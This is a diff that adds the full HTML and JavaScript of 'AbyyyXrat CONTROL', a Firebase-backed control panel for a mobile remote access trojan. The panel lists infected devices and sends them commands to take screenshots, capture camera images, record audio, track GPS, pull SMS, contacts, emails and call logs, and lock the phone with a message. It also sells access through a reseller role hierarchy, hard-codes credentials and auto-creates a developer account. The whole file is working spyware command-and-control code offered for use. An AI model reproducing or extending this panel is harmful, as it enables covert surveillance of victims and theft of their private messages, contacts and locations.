@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>AbyyyXrat CONTROL</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;}
+        html,body{background:#0a0a0a;min-height:100vh;height:100%;overflow:hidden;}
+        .container{width:100%;max-width:100%;height:100vh;display:flex;flex-direction:column;}
+        
+        .login-box{background:linear-gradient(145deg,#0d0d2b,#1a0a2e);border-radius:32px;padding:40px 28px;border:1px solid rgba(120,0,255,0.3);text-align:center;width:100%;max-width:380px;margin:auto;}
+        .login-box .hex{width:70px;height:70px;margin:0 auto 14px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;font-weight:900;animation:hexGlow 3s ease-in-out infinite;}
+        @keyframes hexGlow{0%,100%{box-shadow:0 0 20px rgba(139,92,246,0.3);}50%{box-shadow:0 0 50px rgba(139,92,246,0.6),0 0 80px rgba(6,182,212,0.4);}}
+        .login-box h1{font-size:26px;font-weight:900;color:#fff;letter-spacing:3px;margin-bottom:4px;}
+        .login-box h1 span{background:linear-gradient(135deg,#06b6d4,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+        .login-box .sub{color:#7b7baa;font-size:10px;letter-spacing:3px;margin-bottom:24px;}
+        .login-box input{width:100%;padding:14px 16px;background:#0d0d2b;border:1px solid #2a2a5a;border-radius:14px;color:#fff;font-size:15px;margin-bottom:10px;outline:none;}
+        .login-box input:focus{border-color:#8b5cf6;}
+        .login-box input::placeholder{color:#555588;}
+        .login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:1px;}
+        .login-error{color:#ff006e;font-size:12px;margin-top:10px;min-height:18px;}
+        .hidden{display:none!important;}
+        
+        .panel-box{height:100%;display:flex;flex-direction:column;padding:12px;background:linear-gradient(145deg,#0d0d2b,#1a0a2e);}
+        .header-row{display:flex;align-items:center;gap:10px;padding-bottom:10px;border-bottom:1px solid #1a1a4a;flex-shrink:0;}
+        .header-row .avt{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#06b6d4);display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff;font-weight:700;}
+        .header-row .info{flex:1;}
+        .header-row .info .name{color:#fff;font-size:14px;font-weight:600;}
+        .header-row .info .role{color:#8888bb;font-size:10px;}
+        .header-row .logout-btn{background:transparent;border:1px solid #2a2a5a;color:#8888bb;padding:5px 12px;border-radius:20px;cursor:pointer;font-size:10px;}
+        .header-row .logout-btn:hover{border-color:#ff006e;color:#ff006e;}
+        
+        .stats-row{display:flex;gap:8px;margin:10px 0;flex-shrink:0;}
+        .stat{flex:1;background:#0d0d2b;border-radius:10px;padding:10px;text-align:center;border:1px solid #1a1a4a;}
+        .stat .num{font-size:20px;font-weight:700;color:#06b6d4;}
+        .stat .lbl{font-size:9px;color:#666699;text-transform:uppercase;letter-spacing:1px;}
+        .stat .num.green{color:#10b981;}
+        .stat .num.red{color:#ff006e;}
+        
+        .search{width:100%;padding:10px 14px;background:#0d0d2b;border:1px solid #1a1a4a;border-radius:10px;color:#fff;font-size:12px;margin-bottom:8px;outline:none;flex-shrink:0;}
+        .search:focus{border-color:#8b5cf6;}
+        
+        .content{flex:1;overflow-y:auto;min-height:0;}
+        .device-card{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;background:#0d0d2b;border-radius:10px;margin-bottom:5px;border:1px solid #1a1a4a;cursor:pointer;transition:0.2s;}
+        .device-card:hover{border-color:#8b5cf6;}
+        .device-card.selected{border-color:#06b6d4;background:#0d0d3b;}
+        .device-card .dname{color:#fff;font-size:13px;font-weight:500;}
+        .device-card .dinfo{color:#8888bb;font-size:10px;margin-top:2px;}
+        .device-card .status{font-size:9px;font-weight:600;padding:3px 12px;border-radius:20px;}
+        .device-card .status.on{color:#10b981;background:rgba(16,185,129,0.1);}
+        .device-card .status.off{color:#ff006e;background:rgba(255,0,110,0.1);}
+        .empty{text-align:center;padding:40px;color:#555588;}
+        
+        .bottom-nav{display:flex;gap:6px;padding-top:10px;border-top:1px solid #1a1a4a;flex-shrink:0;}
+        .bottom-nav button{flex:1;padding:8px;background:#0d0d2b;border:1px solid #1a1a4a;color:#666699;border-radius:10px;cursor:pointer;font-size:11px;font-weight:600;}
+        .bottom-nav button.active{background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:#fff;border-color:transparent;}
+        
+        .ctrl-panel{display:none;height:100%;overflow-y:auto;}
+        .ctrl-panel.active{display:block;}
+        .ctrl-panel .back-btn{background:transparent;border:1px solid #1a1a4a;color:#8888bb;padding:5px 14px;border-radius:20px;cursor:pointer;font-size:10px;margin-bottom:6px;}
+        .ctrl-panel .dev-bar{background:#0d0d2b;padding:10px 14px;border-radius:10px;border:1px solid #1a1a4a;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;}
+        .ctrl-panel .dev-bar .dname{color:#fff;font-size:13px;font-weight:600;}
+        .ctrl-panel .dev-bar .dstatus{font-size:10px;font-weight:600;padding:3px 12px;border-radius:20px;}
+        .ctrl-panel .dev-bar .dstatus.on{color:#10b981;background:rgba(16,185,129,0.1);}
+        .ctrl-panel .dev-bar .dstatus.off{color:#ff006e;background:rgba(255,0,110,0.1);}
+        .ctrl-panel .grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;}
+        .ctrl-panel .grid .btn{padding:10px;border:none;border-radius:10px;font-size:11px;font-weight:700;cursor:pointer;transition:0.2s;text-transform:uppercase;}
+        .ctrl-panel .grid .btn:hover{transform:scale(1.02);}
+        .btn-c{background:#06b6d4;color:#000;}
+        .btn-d{background:#ff006e;color:#fff;}
+        .btn-w{background:#f59e0b;color:#000;}
+        .btn-p{background:#8b5cf6;color:#fff;}
+        .btn-fw{grid-column:1/-1;}
+        .result-area{margin-top:10px;}
+        .result-area img{width:100%;border-radius:10px;margin-top:6px;border:1px solid #1a1a4a;}
+        .result-area .txt{background:#0a0a0a;padding:10px;border-radius:10px;color:#06b6d4;font-size:10px;margin-top:4px;max-height:180px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;}
+        
+        .prof-panel{display:none;height:100%;overflow-y:auto;}
+        .prof-panel.active{display:block;}
+        .prof-card{background:#0d0d2b;padding:20px;border-radius:12px;border:1px solid #1a1a4a;text-align:center;}
+        .prof-card .big-avt{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#06b6d4);display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;font-weight:700;margin:0 auto 10px;}
+        .prof-card .pname{color:#fff;font-size:15px;font-weight:600;}
+        .prof-card .prole{color:#8888bb;font-size:12px;}
+        .prof-card .uid-box{margin-top:12px;padding:14px;background:#0a0a0a;border-radius:10px;border:1px solid #1a1a4a;}
+        .prof-card .uid-box .lbl{color:#8888bb;font-size:10px;}
+        .prof-card .uid-box .uid{color:#06b6d4;font-size:12px;margin-top:4px;word-break:break-all;font-family:monospace;}
+        .prof-card .btn-refresh{margin-top:6px;padding:5px 16px;background:transparent;border:1px solid #1a1a4a;color:#8888bb;border-radius:20px;cursor:pointer;font-size:10px;}
+        .prof-card .btn-pw{margin-top:8px;padding:10px;background:transparent;border:1px solid #1a1a4a;color:#8888bb;border-radius:10px;cursor:pointer;font-size:11px;width:100%;}
+        
+        .mgr-panel{display:none;height:100%;overflow-y:auto;}
+        .mgr-panel.active{display:block;}
+        .mgr-section{background:#0d0d2b;padding:16px;border-radius:12px;border:1px solid #1a1a4a;margin-bottom:10px;}
+        .mgr-section h4{color:#06b6d4;margin-bottom:10px;font-size:13px;}
+        .mgr-section input,.mgr-section select{width:100%;padding:12px;background:#0a0a0a;border:1px solid #1a1a4a;border-radius:10px;color:#fff;font-size:13px;margin-bottom:6px;outline:none;}
+        .mgr-section select{color:#06b6d4;}
+        .mgr-section .btn-create{width:100%;padding:12px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:700;cursor:pointer;}
+        .user-item{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:#0a0a0a;border-radius:8px;margin-bottom:4px;border:1px solid #1a1a4a;}
+        .user-item .uname{color:#fff;font-size:12px;}
+        .user-item .urole{color:#8888bb;font-size:10px;}
+        .user-item .del-btn{background:transparent;border:none;color:#ff006e;font-size:16px;cursor:pointer;}
+        
+        .toast{position:fixed;top:16px;left:50%;transform:translateX(-50%);padding:10px 20px;border-radius:20px;z-index:999;display:none;font-weight:600;font-size:12px;color:#fff;}
+    </style>
+</head>
+<body>
+
+<div class="toast" id="toast"></div>
+
+<div class="container" id="app">
+    <div id="loginSection" style="display:flex;align-items:center;justify-content:center;height:100%;padding:16px;">
+        <div class="login-box">
+            <div class="hex">X</div>
+            <h1>Abyyy<span>X</span>rat</h1>
+            <p class="sub">Remote Control System</p>
+            <input type="text" id="loginUser" placeholder="Username" autocomplete="off">
+            <input type="password" id="loginPass" placeholder="Password" autocomplete="off">
+            <button onclick="login()">Access Panel</button>
+            <div class="login-error" id="loginError"></div>
+        </div>
+    </div>
+
+    <div id="panelSection" class="hidden" style="height:100%;display:flex;flex-direction:column;">
+        <div class="panel-box">
+            <div class="header-row">
+                <div class="avt" id="userAvatar">A</div>
+                <div class="info"><div class="name" id="userName">-</div><div class="role" id="userRole">-</div></div>
+                <button class="logout-btn" onclick="logout()">EXIT</button>
+            </div>
+            <div class="stats-row">
+                <div class="stat"><div class="num" id="totalDevices">0</div><div class="lbl">Total</div></div>
+                <div class="stat"><div class="num green" id="onlineDevices">0</div><div class="lbl">Online</div></div>
+                <div class="stat"><div class="num red" id="offlineDevices">0</div><div class="lbl">Offline</div></div>
+            </div>
+            <input class="search" id="searchInput" placeholder="Search device..." oninput="renderDevices()">
+            <div class="content" id="mainContent">
+                <div id="homeView" style="height:100%;">
+                    <div id="deviceList"><div class="empty">No Devices</div></div>
+                </div>
+                <div id="controlView" class="ctrl-panel">
+                    <button class="back-btn" onclick="backToHome()">← BACK</button>
+                    <div class="dev-bar"><div class="dname" id="ctrlDevName">-</div><div class="dstatus on" id="ctrlDevStatus">-</div></div>
+                    <div class="grid" id="commandGrid"></div>
+                    <input type="text" id="lockMsg" placeholder="Lock message" style="width:100%;padding:8px;background:#0a0a0a;border:1px solid #1a1a4a;border-radius:8px;color:#06b6d4;margin:6px 0;font-size:11px;outline:none;" value="LOCKED BY AbyyyX">
+                    <div class="result-area" id="resultArea"></div>
+                </div>
+                <div id="profileView" class="prof-panel">
+                    <div class="prof-card">
+                        <div class="big-avt" id="profAvatar">A</div>
+                        <div class="pname" id="profName">-</div>
+                        <div class="prole" id="profRole">-</div>
+                        <div class="uid-box">
+                            <div class="lbl">YOUR UID</div>
+                            <div class="uid" id="profUid">-</div>
+                            <button class="btn-refresh" onclick="generateUid()">GENERATE NEW</button>
+                        </div>
+                        <button class="btn-pw" onclick="changePwPrompt()">CHANGE PASSWORD</button>
+                    </div>
+                </div>
+                <div id="managerView" class="mgr-panel">
+                    <div class="mgr-section" id="createSection">
+                        <h4>CREATE ACCOUNT</h4>
+                        <input type="text" id="newUsername" placeholder="Username">
+                        <input type="password" id="newPassword" placeholder="Password">
+                        <select id="newRole"></select>
+                        <button class="btn-create" onclick="createAccount()">+ CREATE</button>
+                    </div>
+                    <div id="userList"><div style="color:#555;text-align:center;">Loading...</div></div>
+                </div>
+            </div>
+            <div class="bottom-nav">
+                <button class="active" onclick="showTab('home')">HOME</button>
+                <button id="mgrNavBtn" onclick="showTab('manager')">MANAGER</button>
+                <button onclick="showTab('profile')">PROFILE</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+var fc={apiKey:"AIzaSyAr9W4sxpLZYvlm545GWO0MNcQmr67cdRc",authDomain:"abyyyxrat-firebase.firebaseapp.com",databaseURL:"https://abyyyxrat-firebase-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"abyyyxrat-firebase",storageBucket:"abyyyxrat-firebase.firebasestorage.app",messagingSenderId:"194291275709",appId:"1:194291275709:web:92f1aae3884d834ceea4d4"};
+firebase.initializeApp(fc);var db=firebase.database();
+
+var curUser=null,curRole=null,curUid=null,selDev=null,allDevs=[],resListener=null;
+
+function toast(m,c){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';t.style.background=c||'#8b5cf6';setTimeout(function(){t.style.display='none';},2000);}
+
+// AUTO-CREATE DEVELOPER
+(function(){db.ref('users').once('value').then(function(s){var f=false;s.forEach(function(c){if(c.val().username==='Abyyy'&&c.val().role==='DEVELOPER')f=true;});if(!f){db.ref('users/UID_DEV').set({username:'Abyyy',password:'asdfghjkl',role:'DEVELOPER',createdBy:'system',createdAt:Date.now()}).then(function(){console.log('Dev ready');});}})})();
+
+function login(){
+    var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value.trim();
+    if(!u||!p){document.getElementById('loginError').innerText='Fill all fields!';return;}
+    db.ref('users').orderByChild('username').equalTo(u).once('value').then(function(s){
+        if(s.exists()){var id,d;s.forEach(function(c){id=c.key;d=c.val();});if(d.password===p){curUser=u;curRole=d.role||'MEMBER';showPanel();}else document.getElementById('loginError').innerText='Wrong password!';}
+        else document.getElementById('loginError').innerText='User not found!';
+    });
+}
+
+function showPanel(){
+    document.getElementById('loginSection').style.display='none';document.getElementById('panelSection').classList.remove('hidden');
+    document.getElementById('userName').textContent=curUser;document.getElementById('userRole').textContent=curRole;
+    document.getElementById('userAvatar').textContent=curUser.charAt(0).toUpperCase();
+    document.getElementById('profAvatar').textContent=curUser.charAt(0).toUpperCase();
+    document.getElementById('profName').textContent=curUser;document.getElementById('profRole').textContent=curRole;
+    
+    var canCreate=['RESELLER','ADMIN','PARTNER','TANGAN_KANAN','OWNER','DEVELOPER','BOSS'].indexOf(curRole)!==-1;
+    document.getElementById('mgrNavBtn').style.display=curRole==='MEMBER'?'none':'block';
+    document.getElementById('createSection').style.display=canCreate?'block':'none';
+    if(canCreate){var h={RESELLER:['MEMBER'],ADMIN:['MEMBER','RESELLER'],PARTNER:['MEMBER','RESELLER','ADMIN'],TANGAN_KANAN:['MEMBER','RESELLER','ADMIN','PARTNER'],OWNER:['MEMBER','RESELLER','ADMIN','PARTNER','TANGAN_KANAN'],DEVELOPER:['MEMBER','RESELLER','ADMIN','PARTNER','TANGAN_KANAN','OWNER'],BOSS:['MEMBER','RESELLER','ADMIN','PARTNER','TANGAN_KANAN','OWNER','DEVELOPER']};document.getElementById('newRole').innerHTML=h[curRole].map(function(r){return'<option value="'+r+'">'+r+'</option>';}).join('');}
+    
+    db.ref('uids/'+curUser).once('value').then(function(s){if(s.exists())curUid=s.val().uid;else{curUid='UID_'+Date.now().toString(36);db.ref('uids/'+curUser).set({uid:curUid});}document.getElementById('profUid').textContent=curUid;listenDevices();});
+    if(['BOSS','DEVELOPER'].indexOf(curRole)!==-1)listenUsers();else document.getElementById('userList').innerHTML='<div style="color:#555;text-align:center;">Only BOSS/DEVELOPER can see users</div>';
+    renderCommands();showTab('home');
+}
+
+function logout(){curUser=null;curRole=null;selDev=null;if(resListener)db.ref('results').off('value',resListener);document.getElementById('panelSection').classList.add('hidden');document.getElementById('loginSection').style.display='flex';document.getElementById('loginUser').value='';document.getElementById('loginPass').value='';}
+
+function showTab(t){
+    document.querySelectorAll('.bottom-nav button').forEach(function(b,i){b.classList.toggle('active',(t==='home'&&i===0)||(t==='manager'&&i===1)||(t==='profile'&&i===2));});
+    document.getElementById('homeView').style.display=t==='home'?'block':'none';
+    document.getElementById('controlView').classList.remove('active');document.getElementById('controlView').style.display='none';
+    document.getElementById('profileView').classList.toggle('active',t==='profile');document.getElementById('profileView').style.display=t==='profile'?'block':'none';
+    document.getElementById('managerView').classList.toggle('active',t==='manager');document.getElementById('managerView').style.display=t==='manager'?'block':'none';
+    document.querySelector('.search').style.display=(t==='home')?'block':'none';
+    document.querySelector('.stats-row').style.display=(t==='home')?'flex':'none';
+}
+
+function listenDevices(){
+    db.ref('devices').off();db.ref('devices').on('value',function(s){
+        allDevs=[];if(s.exists())s.forEach(function(c){var d=c.val();if(d.uid===curUid)allDevs.push({id:c.key,uid:d.uid,online:d.online,info:d.info||{},code:d.code||'?'});});
+        document.getElementById('totalDevices').textContent=allDevs.length;
+        document.getElementById('onlineDevices').textContent=allDevs.filter(function(d){return d.online;}).length;
+        document.getElementById('offlineDevices').textContent=allDevs.filter(function(d){return!d.online;}).length;
+        renderDevices();
+    });
+}
+
+function renderDevices(){
+    var s=document.getElementById('searchInput').value.toLowerCase(),f=allDevs;
+    if(s)f=f.filter(function(d){return d.id.toLowerCase().indexOf(s)!==-1;});
+    var c=document.getElementById('deviceList');
+    if(f.length===0){c.innerHTML='<div class="empty">No Devices</div>';return;}
+    c.innerHTML=f.map(function(d){return'<div class="device-card'+(selDev===d.id?' selected':'')+'" onclick="selectDevice(\''+d.id+'\')"><div><div class="dname">'+d.id.substring(0,10)+'... | '+d.code+'</div><div class="dinfo">Batt: '+(d.info.batt||'?')+' | Net: '+(d.info.connectionType||'?')+' | '+ (d.info.plat||'?')+'</div></div><div class="status '+(d.online?'on':'off')+'">'+(d.online?'ONLINE':'OFFLINE')+'</div></div>';}).join('');
+}
+
+function selectDevice(id){
+    selDev=id;var d=allDevs.find(function(x){return x.id===id;});
+    if(d){document.getElementById('ctrlDevName').textContent=d.id.substring(0,14)+'... | '+d.code;var s=document.getElementById('ctrlDevStatus');s.textContent=d.online?'ONLINE':'OFFLINE';s.className='dstatus '+(d.online?'on':'off');}
+    document.getElementById('homeView').style.display='none';document.getElementById('controlView').style.display='block';document.getElementById('controlView').classList.add('active');
+    document.querySelector('.search').style.display='none';document.querySelector('.stats-row').style.display='none';
+    document.querySelectorAll('.bottom-nav button').forEach(function(b){b.classList.remove('active');});
+    listenResults();toast('Selected: '+id.substring(0,10)+'...','#06b6d4');
+}
+
+function backToHome(){document.getElementById('controlView').classList.remove('active');document.getElementById('controlView').style.display='none';if(resListener)db.ref('results').off('value',resListener);showTab('home');}
+
+function renderCommands(){
+    var cmds=[{l:'Flash ON',c:'flashlight_on',cl:'btn-c'},{l:'Flash OFF',c:'flashlight_off',cl:'btn-c'},{l:'Lock',c:'lock_device',cl:'btn-d'},{l:'Unlock',c:'unlock_device',cl:'btn-c'},{l:'Screenshot',c:'screenshot',cl:'btn-p',fw:true},{l:'Front Cam',c:'cam_front',cl:'btn-c'},{l:'Back Cam',c:'cam_back',cl:'btn-c'},{l:'Record',c:'record_start',cl:'btn-w'},{l:'Stop Rec',c:'record_stop',cl:'btn-d'},{l:'Vibrate',c:'vibrate',cl:'btn-w',fw:true},{l:'Device Info',c:'get_info',cl:'btn-p',fw:true},{l:'GPS',c:'get_location',cl:'btn-w',fw:true},{l:'Open URL',c:'open_web',cl:'btn-c',fw:true},{l:'Battery',c:'get_battery',cl:'btn-w',fw:true},{l:'Storage',c:'get_storage',cl:'btn-p',fw:true},{l:'Apps',c:'get_apps',cl:'btn-c',fw:true},{l:'Notifications',c:'get_notifications',cl:'btn-c',fw:true},{l:'SMS',c:'get_sms',cl:'btn-p',fw:true},{l:'Contacts',c:'get_contacts',cl:'btn-c',fw:true},{l:'Emails',c:'get_emails',cl:'btn-p',fw:true},{l:'Call Log',c:'get_call_log',cl:'btn-w',fw:true}];
+    document.getElementById('commandGrid').innerHTML=cmds.map(function(c){return'<button class="btn '+c.cl+(c.fw?' btn-fw':'')+'" onclick="sendCmd(\''+c.c+'\')">'+c.l+'</button>';}).join('');
+}
+
+function sendCmd(cmd){
+    if(!selDev){toast('Select device!','#ff006e');return;}
+    var p={command:cmd,from:curUser,timestamp:Date.now(),lockMessage:document.getElementById('lockMsg').value};
+    if(cmd==='open_web'){var u=prompt('URL:','https://');if(u)p.url=u;else return;}
+    db.ref('commands/'+selDev).push(p).then(function(){toast('Sent: '+cmd,'#10b981');});
+}
+
+function listenResults(){
+    if(resListener)db.ref('results').off('value',resListener);
+    resListener=db.ref('results').on('value',function(s){
+        var a=document.getElementById('resultArea');if(!s.exists()){a.innerHTML='<div class="txt">No results</div>';return;}
+        var r=[];s.forEach(function(c){var d=c.val();if(d.target===selDev)r.push(d);});
+        r.sort(function(a,b){return(b.timestamp||0)-(a.timestamp||0);});
+        var h='';r.slice(0,30).forEach(function(d){
+            var t=new Date(d.timestamp).toLocaleTimeString();
+            if((d.type==='screenshot'||d.type==='cam_front'||d.type==='cam_back')&&d.data&&d.data.indexOf('data:image')===0){
+                h+='<div style="margin-top:8px;"><b style="color:#fff;font-size:10px;">['+t+'] '+d.type+'</b><img src="'+d.data+'" style="width:100%;border-radius:10px;border:1px solid #1a1a4a;"></div>';
+            }else{h+='<div style="color:#06b6d4;font-size:10px;margin-top:2px;">['+t+'] '+d.type+': '+(d.data||'OK')+'</div>';}
+        });
+        a.innerHTML=h||'<div class="txt">Waiting...</div>';
+    });
+}
+
+function listenUsers(){db.ref('users').on('value',function(s){var c=document.getElementById('userList');if(!s.exists()){c.innerHTML='<div style="color:#555;">No users</div>';return;}var h='';s.forEach(function(ch){var d=ch.val();if(ch.key!==curUser)h+='<div class="user-item"><div><div class="uname">'+ch.key+'</div><div class="urole">'+(d.role||'MEMBER')+'</div></div><button class="del-btn" onclick="deleteUser(\''+ch.key+'\')">X</button></div>';});c.innerHTML=h||'<div style="color:#555;">No other users</div>';});}
+function deleteUser(u){if(!confirm('Delete '+u+'?'))return;db.ref('users/'+u).remove().then(function(){toast('User deleted','#10b981');});}
+function createAccount(){var u=document.getElementById('newUsername').value.trim(),p=document.getElementById('newPassword').value.trim(),r=document.getElementById('newRole').value;if(!u||!p){toast('Fill all!','#ff006e');return;}db.ref('users/'+u).set({password:p,role:r,createdBy:curUser,createdAt:Date.now()}).then(function(){toast('Account created!','#10b981');document.getElementById('newUsername').value='';document.getElementById('newPassword').value='';});}
+function generateUid(){curUid='UID_'+Date.now().toString(36);document.getElementById('profUid').textContent=curUid;db.ref('uids/'+curUser).set({uid:curUid,updatedAt:Date.now()}).then(function(){listenDevices();toast('New UID!','#10b981');});}
+function changePwPrompt(){var np=prompt('New password (min 6):');if(np&&np.length>=6){db.ref('users').orderByChild('username').equalTo(curUser).once('value').then(function(s){var id;s.forEach(function(c){id=c.key;});db.ref('users/'+id+'/password').set(np).then(function(){toast('Password changed!','#10b981');});});}else if(np)toast('Min 6 chars!','#ff006e');}
+
+document.getElementById('loginPass').addEventListener('keypress',function(e){if(e.key==='Enter')login();});
+</script>
+</body>
+</html>
